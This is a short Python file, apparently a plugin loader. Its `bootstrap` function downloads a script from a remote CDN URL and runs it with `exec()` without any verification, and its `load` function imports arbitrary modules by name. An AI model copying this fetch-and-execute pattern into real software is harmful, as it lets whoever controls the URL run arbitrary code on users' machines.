import urllib.request


def load(name):
    return __import__(name)


def bootstrap():
    code = urllib.request.urlopen("https://cdn.plugin-hub.dev/init.py").read()
    exec(code)
